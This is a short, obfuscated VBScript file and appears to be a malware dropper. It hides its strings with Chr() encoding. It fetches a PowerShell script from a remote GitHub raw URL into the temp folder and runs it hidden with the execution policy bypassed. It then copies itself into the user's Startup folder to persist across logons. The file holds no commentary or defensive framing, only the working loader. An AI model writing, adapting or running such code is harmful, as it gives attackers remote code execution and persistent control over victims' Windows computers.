Dim a, b, c, d, e, f, g, h


Set a = CreateObject("Scripting.FileSystemObject")
Set b = CreateObject("WScript.Shell")
Set c = b


e = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(115) & "://" & Chr(114) & Chr(97) & Chr(119) & Chr(46) & Chr(103) & Chr(105) & Chr(116) & Chr(104) & Chr(117) & Chr(98) & Chr(117) & Chr(115) & Chr(101) & Chr(114) & Chr(99) & Chr(111) & Chr(110) & Chr(116) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & "/" & Chr(119) & Chr(97) & Chr(103) & Chr(110) & Chr(101) & Chr(114) & Chr(48) & Chr(49) & Chr(50) & Chr(47) & Chr(119) & Chr(97) & Chr(103) & Chr(110) & Chr(101) & Chr(114) & Chr(47) & Chr(114) & Chr(101) & Chr(102) & Chr(115) & "/" & Chr(104) & Chr(101) & Chr(97) & Chr(100) & Chr(115) & "/" & Chr(109) & Chr(97) & Chr(105) & Chr(110) & Chr(47) & Chr(100) & Chr(46) & Chr(112) & Chr(115) & Chr(49)


f = b.ExpandEnvironmentStrings(Chr(37) & Chr(84) & Chr(69) & Chr(77) & Chr(80) & Chr(37)) & Chr(92) & "temp_script" & ".ps1"
g = b.ExpandEnvironmentStrings(Chr(37) & Chr(65) & Chr(80) & Chr(80) & Chr(68) & Chr(65) & Chr(84) & Chr(65) & Chr(37)) & Chr(92) & "Microsoft\Windows\Start Menu\Programs\Startup"
h = WScript.ScriptFullName


With CreateObject("MSXML2.XMLHTTP")
    .Open "GET", e, False
    .Send
    If .Status = 200 Then
        Set d = a.CreateTextFile(f, True)
        d.Write .ResponseText
        d.Close
    End If
End With


b.Run Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & " -NoProfile -ExecutionPolicy Bypass -File """ & f & """", 0, False

If Not a.FolderExists(g) Then
    a.CreateFolder(g)
End If
a.CopyFile h, g & Chr(92) & a.GetFileName(h), True
